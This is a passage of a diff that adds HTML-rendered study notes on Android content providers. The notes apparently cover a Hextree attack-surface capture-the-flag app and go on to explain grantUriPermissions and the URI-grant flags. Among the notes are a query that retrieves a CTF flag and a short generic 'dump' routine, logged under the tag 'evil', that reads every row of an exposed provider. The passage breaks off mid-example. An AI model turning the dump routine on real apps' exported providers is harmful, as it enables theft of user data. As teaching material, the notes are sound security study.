+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a><span class="bu">Cursor</span> cursor <span class="op">=</span> <span class="fu">getContentResolver</span><span class="op">().</span><span class="fu">query</span><span class="op">(</span>uri<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">);</span></span></code></pre></div>
+<blockquote>
+<p><strong>Important</strong>: remember to declare <code>&lt;queries&gt;</code>.</p>
+</blockquote>
+<h3 id="content-providers-urimatcher">Content providers &amp; UriMatcher</h3>
+<p>Let’s say that the app <code>io.hextree.attacksurface</code> has the following ContentProvider:</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">provider</span></span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.providers.Flag31Provider&quot;</span></span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:enabled=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:authorities=</span><span class="st">&quot;io.hextree.flag31&quot;</span>/&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb15"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag31Provider <span class="kw">extends</span> ContentProvider <span class="op">{</span></span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">...</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a>    <span class="dt">static</span> <span class="op">{</span></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>        UriMatcher uriMatcher2 <span class="op">=</span> <span class="kw">new</span> <span class="fu">UriMatcher</span><span class="op">(-</span><span class="dv">1</span><span class="op">);</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>        uriMatcher <span class="op">=</span> uriMatcher2<span class="op">;</span></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>        uriMatcher2<span class="op">.</span><span class="fu">addURI</span><span class="op">(</span>AUTHORITY<span class="op">,</span> <span class="st">&quot;flags&quot;</span><span class="op">,</span> <span class="dv">1</span><span class="op">);</span></span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a>        uriMatcher2<span class="op">.</span><span class="fu">addURI</span><span class="op">(</span>AUTHORITY<span class="op">,</span> <span class="st">&quot;flag/#&quot;</span><span class="op">,</span> <span class="dv">2</span><span class="op">);</span></span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span> <span class="co">// android.content.ContentProvider</span></span>
+<span id="cb15-12"><a href="#cb15-12" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="bu">Cursor</span> <span class="fu">query</span><span class="op">(</span>Uri uri<span class="op">,</span> <span class="bu">String</span><span class="op">[]</span> strArr<span class="op">,</span> <span class="bu">String</span> str<span class="op">,</span> <span class="bu">String</span><span class="op">[]</span> strArr2<span class="op">,</span> <span class="bu">String</span> str2<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb15-13"><a href="#cb15-13" aria-hidden="true" tabindex="-1"></a>        <span class="bu">StringBuilder</span> sbAppend <span class="op">=</span> <span class="kw">new</span> <span class="bu">StringBuilder</span><span class="op">(</span><span class="st">&quot;Flag31Provider.query(&#39;&quot;</span><span class="op">).</span><span class="fu">append</span><span class="op">(</span>uri<span class="op">.</span><span class="fu">getPath</span><span class="op">()).</span><span class="fu">append</span><span class="op">(</span><span class="st">&quot;&#39;): &quot;</span><span class="op">);</span></span>
+<span id="cb15-14"><a href="#cb15-14" aria-hidden="true" tabindex="-1"></a>        UriMatcher uriMatcher2 <span class="op">=</span> uriMatcher<span class="op">;</span></span>
+<span id="cb15-15"><a href="#cb15-15" aria-hidden="true" tabindex="-1"></a>        Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag31&quot;</span><span class="op">,</span> sbAppend<span class="op">.</span><span class="fu">append</span><span class="op">(</span>uriMatcher2<span class="op">.</span><span class="fu">match</span><span class="op">(</span>uri<span class="op">)).</span><span class="fu">toString</span><span class="op">());</span></span>
+<span id="cb15-16"><a href="#cb15-16" aria-hidden="true" tabindex="-1"></a>        SQLiteDatabase readableDatabase <span class="op">=</span> <span class="kw">this</span><span class="op">.</span><span class="fu">dbHelper</span><span class="op">.</span><span class="fu">getReadableDatabase</span><span class="op">();</span></span>
+<span id="cb15-17"><a href="#cb15-17" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> iMatch <span class="op">=</span> uriMatcher2<span class="op">.</span><span class="fu">match</span><span class="op">(</span>uri<span class="op">);</span></span>
+<span id="cb15-18"><a href="#cb15-18" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>iMatch <span class="op">==</span> <span class="dv">1</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb15-19"><a href="#cb15-19" aria-hidden="true" tabindex="-1"></a>            <span class="cf">throw</span> <span class="kw">new</span> <span class="bu">IllegalArgumentException</span><span class="op">(</span><span class="st">&quot;FLAGS not implemented yet: &quot;</span> <span class="op">+</span> uri<span class="op">);</span></span>
+<span id="cb15-20"><a href="#cb15-20" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb15-21"><a href="#cb15-21" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>iMatch <span class="op">==</span> <span class="dv">2</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb15-22"><a href="#cb15-22" aria-hidden="true" tabindex="-1"></a>            <span class="dt">long</span> id <span class="op">=</span> ContentUris<span class="op">.</span><span class="fu">parseId</span><span class="op">(</span>uri<span class="op">);</span></span>
+<span id="cb15-23"><a href="#cb15-23" aria-hidden="true" tabindex="-1"></a>            Log<span class="op">.</span><span class="fu">i</span><span class="op">(</span><span class="st">&quot;Flag31&quot;</span><span class="op">,</span> <span class="st">&quot;FLAG_ID: &quot;</span> <span class="op">+</span> id<span class="op">);</span></span>
+<span id="cb15-24"><a href="#cb15-24" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="op">(</span>id <span class="op">==</span> <span class="dv">31</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb15-25"><a href="#cb15-25" aria-hidden="true" tabindex="-1"></a>                <span class="fu">success</span><span class="op">(</span>logHelper<span class="op">);</span></span>
+<span id="cb15-26"><a href="#cb15-26" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb15-27"><a href="#cb15-27" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span> readableDatabase<span class="op">.</span><span class="fu">query</span><span class="op">(</span>FlagDatabaseHelper<span class="op">.</span><span class="fu">TABLE_FLAG</span><span class="op">,</span> strArr<span class="op">,</span> <span class="st">&quot;name=? AND visible=1&quot;</span><span class="op">,</span> <span class="kw">new</span> <span class="bu">String</span><span class="op">[]{</span><span class="st">&quot;flag&quot;</span> <span class="op">+</span> id<span class="op">},</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> str2<span class="op">);</span></span>
+<span id="cb15-28"><a href="#cb15-28" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb15-29"><a href="#cb15-29" aria-hidden="true" tabindex="-1"></a>        <span class="cf">throw</span> <span class="kw">new</span> <span class="bu">IllegalArgumentException</span><span class="op">(</span><span class="st">&quot;Unknown URI: &quot;</span> <span class="op">+</span> uri<span class="op">);</span></span>
+<span id="cb15-30"><a href="#cb15-30" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb15-31"><a href="#cb15-31" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>To retrieve the flag, you simply need to perform a query as shown below:</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a>Uri uri <span class="op">=</span> Uri<span class="op">.</span><span class="fu">parse</span><span class="op">(</span><span class="st">&quot;content://io.hextree.flag31/flag/31&quot;</span><span class="op">);</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a><span class="bu">Cursor</span> cursor <span class="op">=</span> <span class="fu">getContentResolver</span><span class="op">().</span><span class="fu">query</span><span class="op">(</span>uri<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">);</span></span></code></pre></div>
+<h3 id="general-example-to-dump-content-provider">General example to dump content provider</h3>
+<p>Source: [<a href="https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/#capturing-app-permissions">↗</a>]</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="dt">void</span> <span class="fu">dump</span><span class="op">(</span>Uri uri<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a>    <span class="bu">Cursor</span> cursor <span class="op">=</span> <span class="fu">getContentResolver</span><span class="op">().</span><span class="fu">query</span><span class="op">(</span>uri<span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">,</span> <span class="kw">null</span><span class="op">);</span></span>
+<span id="cb17-3"><a href="#cb17-3" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>cursor<span class="op">.</span><span class="fu">moveToFirst</span><span class="op">())</span> <span class="op">{</span></span>
+<span id="cb17-4"><a href="#cb17-4" aria-hidden="true" tabindex="-1"></a>        <span class="cf">do</span> <span class="op">{</span></span>
+<span id="cb17-5"><a href="#cb17-5" aria-hidden="true" tabindex="-1"></a>            <span class="bu">StringBuilder</span> sb <span class="op">=</span> <span class="kw">new</span> <span class="bu">StringBuilder</span><span class="op">();</span></span>
+<span id="cb17-6"><a href="#cb17-6" aria-hidden="true" tabindex="-1"></a>            <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> cursor<span class="op">.</span><span class="fu">getColumnCount</span><span class="op">();</span> i<span class="op">++)</span> <span class="op">{</span></span>
+<span id="cb17-7"><a href="#cb17-7" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(</span>sb<span class="op">.</span><span class="fu">length</span><span class="op">()</span> <span class="op">&gt;</span> <span class="dv">0</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb17-8"><a href="#cb17-8" aria-hidden="true" tabindex="-1"></a>                    sb<span class="op">.</span><span class="fu">append</span><span class="op">(</span><span class="st">&quot;, &quot;</span><span class="op">);</span></span>
+<span id="cb17-9"><a href="#cb17-9" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb17-10"><a href="#cb17-10" aria-hidden="true" tabindex="-1"></a>                sb<span class="op">.</span><span class="fu">append</span><span class="op">(</span>cursor<span class="op">.</span><span class="fu">getColumnName</span><span class="op">(</span>i<span class="op">)</span> <span class="op">+</span> <span class="st">&quot; = &quot;</span> <span class="op">+</span> cursor<span class="op">.</span><span class="fu">getString</span><span class="op">(</span>i<span class="op">));</span></span>
+<span id="cb17-11"><a href="#cb17-11" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb17-12"><a href="#cb17-12" aria-hidden="true" tabindex="-1"></a>            Log<span class="op">.</span><span class="fu">d</span><span class="op">(</span><span class="st">&quot;evil&quot;</span><span class="op">,</span> sb<span class="op">.</span><span class="fu">toString</span><span class="op">());</span></span>
+<span id="cb17-13"><a href="#cb17-13" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">while</span> <span class="op">(</span>cursor<span class="op">.</span><span class="fu">moveToNext</span><span class="op">());</span></span>
+<span id="cb17-14"><a href="#cb17-14" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb17-15"><a href="#cb17-15" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<hr />
+<h2 id="sharing-provider-access-granturipermissions">Sharing Provider access: grantUriPermissions</h2>
+<p>The attribute <code>android:grantUriPermissions</code> is a security feature in the Android Manifest within <code>&lt;provider&gt;</code> elements. It controls whether your app can create a “temporary guest pass” for other apps to access specific data they are normally forbidden from touching.</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">provider</span></span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;.MyContentProvider&quot;</span></span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:authorities=</span><span class="st">&quot;com.example.provider&quot;</span></span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:grantUriPermissions=</span><span class="st">&quot;true&quot;</span>&gt; <span class="co">&lt;!-- OR false --&gt;</span></span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">provider</span>&gt;</span></code></pre></div>
+<p>Attribute behavior:</p>
+<ul>
+<li><p><code>true</code>: The system allows permission grants for any data hosted by this provider.</p></li>
+<li><p><code>false</code> (Default): Dynamic permission grants are generally disabled. However, you can whitelist specific data subsets (paths) using the <code>&lt;grant-uri-permission&gt;</code> child element.</p>
+<p><strong>Example: whitelisting specific paths</strong></p>
+<p>If the main attribute is set to false, you can define granular access like this:</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">provider</span></span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;.MyContentProvider&quot;</span></span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:authorities=</span><span class="st">&quot;com.example.provider&quot;</span></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:grantUriPermissions=</span><span class="st">&quot;false&quot;</span>&gt;</span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a>    <span class="co">&lt;!-- Only allow granting permissions for files in the /reports/ folder --&gt;</span></span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">grant-uri-permission</span><span class="ot"> android:pathPrefix=</span><span class="st">&quot;/reports/&quot;</span> /&gt;</span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">provider</span>&gt;</span></code></pre></div></li>
+</ul>
+<h3 id="flag_grant_read_uri_permission-flag_grant_write_uri_permission">FLAG_GRANT_READ_URI_PERMISSION &amp; FLAG_GRANT_WRITE_URI_PERMISSION</h3>
+<p>These two flags are used to authorize the temporary access.</p>
+<ul>
+<li><code>FLAG_GRANT_READ_URI_PERMISSION</code> -&gt; Constant Value: <code>1</code></li>
+<li><code>FLAG_GRANT_WRITE_URI_PERMISSION</code> -&gt; Constant Value: <code>2</code></li>
+</ul>
+<blockquote>
+<p><strong>Note</strong>: If you decompile an app using <strong>jadx</strong>, you might see a call like <code>intent.addFlags(3)</code>. The value <strong><code>3</code></strong> corresponds to a combination of <code>FLAG_GRANT_READ_URI_PERMISSION</code> and <code>FLAG_GRANT_WRITE_URI_PERMISSION</code>. This happens because the original source code likely looked something like:</p>
+<pre><code>intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION) </code></pre>
+<p>The <code>|</code> operator is the bitwise OR operator, which is used to combine multiple flag values into a single integer.</p>
+<pre><code>FLAG_GRANT_READ_URI_PERMISSION      = 0000 0001
+FLAG_GRANT_WRITE_URI_PERMISSION     = 0000 0010
+-----------------------------------------------
+Using | (OR):                       = 0000 0011</code></pre>
+</blockquote>
+<h3 id="granting-the-permission-with-an-intent">Granting the permission with an intent</h3>
+<p>When a sending app (App A) wants to share a file with a target app (App B), for example via an “Open With” action, <strong>App A must append a flag</strong> to the Intent.</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a>Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">(</span>Intent<span class="op">.</span><span class="fu">ACTION_VIEW</span><span class="op">);</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a>intent<span class="op">.</span><span class="fu">setDataAndType</span><span class="op">(</span>uri<span class="op">,</span> <span class="st">&quot;application/pdf&quot;</span><span class="op">);</span></span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true" tabindex="-1"></a><span class="co">// This flag authorizes the temporary access</span></span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true" tabindex="-1"></a>intent<span class="op">.</span><span class="fu">addFlags</span><span class="op">(</span>Intent<span class="op">.</span><span class="fu">FLAG_GRANT_READ_URI_PERMISSION</span><span class="op">);</span> </span>
+<span id="cb22-6"><a href="#cb22-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb22-7"><a href="#cb22-7" aria-hidden="true" tabindex="-1"></a><span class="fu">startActivity</span><span class="op">(</span>intent<span class="op">);</span></span></code></pre></div>
+<p><strong>Under the Hood</strong></p>
+<ol type="1">
+<li>App A sends Intent to Android OS.</li>
+<li>The OS checks App A’s Manifest. Is <code>grantUriPermissions="true"</code>? Or is the URI in <code>&lt;grant-uri-permission&gt;</code>?</li>
+<li>If valid, the OS creates a temporary permission record linking the Content URI, App A, and the Target App (App B).</li>
+<li>App B starts and can now call <code>getContentResolver()</code>.</li>
+</ol>
+<blockquote>
+<p><strong>Note</strong>: Sharing access via <code>startActivity</code> is not the only vector to access the provider. When an application transmits an Intent via <code>startService</code> <code>setResult()</code>, etc., and includes the <code>FLAG_GRANT_READ_URI_PERMISSION</code> or <code>FLAG_GRANT_WRITE_URI_PERMISSION</code>, the receiving application is granted access to the URI specified in the Intent’s data.</p>
+</blockquote>
+<details>
+<summary>
+Practical example
+</summary>
+<p>Imagine two applications:</p>
+<ul>
+<li><strong>App A</strong>: Holds secret data. It is protected by a strict custom permission that no normal app possesses. However, App A wants to share one specific record with App B.</li>
+<li><strong>App B</strong>: Does not have the permissions required to enter App A’s vault, but it receives a temporary invitation to view that single record.</li>
+</ul>
+<p><strong>App A</strong></p>
+<p>Here, we define a strict signature-level permission and apply it to the provider. Crucially, we set <code>grantUriPermissions="true"</code>, which allows us to override that strict permission on a case-by-case basis.</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">manifest</span><span class="ot"> xmlns:android=</span><span class="st">&quot;http://schemas.android.com/apk/res/android&quot;</span></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    package=</span><span class="st">&quot;com.example.appa&quot;</span>&gt;</span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a>    <span class="co">&lt;!-- 1. Define a strict, signature-level permission --&gt;</span></span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">permission</span> </span>
+<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a><span class="ot">        android:name=</span><span class="st">&quot;com.example.appa.READ_SECRET&quot;</span></span>
+<span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a><span class="ot">        android:protectionLevel=</span><span class="st">&quot;signature&quot;</span> /&gt;</span>
+<span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-9"><a href="#cb23-9" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">application</span> <span class="er">...</span> &gt;</span>
+<span id="cb23-10"><a href="#cb23-10" aria-hidden="true" tabindex="-1"></a>        </span>
+<span id="cb23-11"><a href="#cb23-11" aria-hidden="true" tabindex="-1"></a>        <span class="co">&lt;!-- 2. The Provider Configuration --&gt;</span></span>
+<span id="cb23-12"><a href="#cb23-12" aria-hidden="true" tabindex="-1"></a>        <span class="co">&lt;!-- exported=&quot;true&quot;: The provider is visible to other apps. --&gt;</span></span>
+<span id="cb23-13"><a href="#cb23-13" aria-hidden="true" tabindex="-1"></a>        <span class="co">&lt;!-- permission=&quot;...&quot;: but, only apps with the signature permission can enter. --&gt;</span></span>
+<span id="cb23-14"><a href="#cb23-14" aria-hidden="true" tabindex="-1"></a>        <span class="co">&lt;!-- grantUriPermissions=&quot;true&quot;: Allows us to issue temporary keys to bypass the permission lock. --&gt;</span></span>
+<span id="cb23-15"><a href="#cb23-15" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">provider</span></span>
+<span id="cb23-16"><a href="#cb23-16" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:name=</span><span class="st">&quot;.SecretProvider&quot;</span></span>
+<span id="cb23-17"><a href="#cb23-17" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:authorities=</span><span class="st">&quot;com.example.appa.provider&quot;</span></span>
+<span id="cb23-18"><a href="#cb23-18" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:exported=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb23-19"><a href="#cb23-19" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:grantUriPermissions=</span><span class="st">&quot;true&quot;</span></span>
+<span id="cb23-20"><a href="#cb23-20" aria-hidden="true" tabindex="-1"></a><span class="ot">            android:permission=</span><span class="st">&quot;com.example.appa.READ_SECRET&quot;</span> /&gt;</span>
+<span id="cb23-21"><a href="#cb23-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-22"><a href="#cb23-22" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">activity</span><span class="ot"> android:name=</span><span class="st">&quot;.MainActivity&quot;</span><span class="ot"> android:exported=</span><span class="st">&quot;true&quot;</span>&gt;</span>
+<span id="cb23-23"><a href="#cb23-23" aria-hidden="true" tabindex="-1"></a>            <span class="co">&lt;!-- ... --&gt;</span></span>
+<span id="cb23-24"><a href="#cb23-24" aria-hidden="true" tabindex="-1"></a>        &lt;/<span class="kw">activity</span>&gt;</span>
+<span id="cb23-25"><a href="#cb23-25" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">application</span>&gt;</span>
+<span id="cb23-26"><a href="#cb23-26" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">manifest</span>&gt;</span></code></pre></div>
+<p><strong>MainActivity.java</strong></p>
+<p>This Activity constructs an Intent to launch App B. It attaches the secret data and the “guest pass” flag.</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> MainActivity <span class="kw">extends</span> Activity <span class="op">{</span></span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle savedInstanceState<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>savedInstanceState<span class="op">);</span></span>
+<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a>        <span class="bu">Button</span> btn <span class="op">=</span> <span class="kw">new</span> <span class="bu">Button</span><span class="op">(</span><span class="kw">this</span><span class="op">);</span></span>
+<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a>        btn<span class="op">.</span><span class="fu">setText</span><span class="op">(</span><span class="st">&quot;Grant Permission to App B&quot;</span><span class="op">);</span></span>
+<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a>        <span class="fu">setContentView</span><span class="op">(</span>btn<span class="op">);</span></span>
+<span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-9"><a href="#cb24-9" aria-hidden="true" tabindex="-1"></a>        btn<span class="op">.</span><span class="fu">setOnClickListener</span><span class="op">(</span>v <span class="op">-&gt;</span> <span class="op">{</span></span>
+<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a>            <span class="co">// The specific data record we want to share</span></span>
+<span id="cb24-11"><a href="#cb24-11" aria-hidden="true" tabindex="-1"></a>            Uri secretUri <span class="op">=</span> Uri<span class="op">.</span><span class="fu">parse</span><span class="op">(</span><span class="st">&quot;content://com.example.appa.provider/secrets/1&quot;</span><span class="op">);</span></span>
+<span id="cb24-12"><a href="#cb24-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-13"><a href="#cb24-13" aria-hidden="true" tabindex="-1"></a>            Intent intent <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb24-14"><a href="#cb24-14" aria-hidden="true" tabindex="-1"></a>            <span class="co">// Explicitly targeting App B</span></span>
+<span id="cb24-15"><a href="#cb24-15" aria-hidden="true" tabindex="-1"></a>            intent<span class="op">.</span><span class="fu">setComponent</span><span class="op">(</span><span class="kw">new</span> <span class="fu">ComponentName</span><span class="op">(</span><span class="st">&quot;com.example.appb&quot;</span><span class="op">,</span> <span class="st">&quot;com.example.appb.MainActivity&quot;</span><span class="op">));</span></span>
+<span id="cb24-16"><a href="#cb24-16" aria-hidden="true" tabindex="-1"></a>            </span>
+<span id="cb24-17"><a href="#cb24-17" aria-hidden="true" tabindex="-1"></a>            <span class="co">// 1. Attach the specific data</span></span>
+<span id="cb24-18"><a href="#cb24-18" aria-hidden="true" tabindex="-1"></a>            intent<span class="op">.</span><span class="fu">setData</span><span class="op">(</span>secretUri<span class="op">);</span></span>
+<span id="cb24-19"><a href="#cb24-19" aria-hidden="true" tabindex="-1"></a>            </span>
+<span id="cb24-20"><a href="#cb24-20" aria-hidden="true" tabindex="-1"></a>            <span class="co">// 2. Add the &quot;Guest Pass&quot; Flag</span></span>
+<span id="cb24-21"><a href="#cb24-21" aria-hidden="true" tabindex="-1"></a>            <span class="co">// This tells Android: &quot;Allow the recipient of this Intent to read this specific URI.&quot;</span></span>
+<span id="cb24-22"><a href="#cb24-22" aria-hidden="true" tabindex="-1"></a>            intent<span class="op">.</span><span class="fu">addFlags</span><span class="op">(</span>Intent<span class="op">.</span><span class="fu">FLAG_GRANT_READ_URI_PERMISSION</span><span class="op">);</span></span>
+<span id="cb24-23"><a href="#cb24-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-24"><a href="#cb24-24" aria-hidden="true" tabindex="-1"></a>            <span class="fu">startActivity</span><span class="op">(</span>intent<span class="op">);</span></span>
+<span id="cb24-25"><a href="#cb24-25" aria-hidden="true" tabindex="-1"></a>        <span class="op">});</span></span>
+<span id="cb24-26"><a href="#cb24-26" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb24-27"><a href="#cb24-27" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p><strong>App B</strong></p>
+<p>App B is a standard app. It has no <uses-permission> tags for App A’s data in its manifest.</p>
+<p><strong>MainActivity.java</strong></p>
+<p>This activity receives the URI via the Intent. Because the Intent carries the permission flag, App B can query the provider successfully.</p>
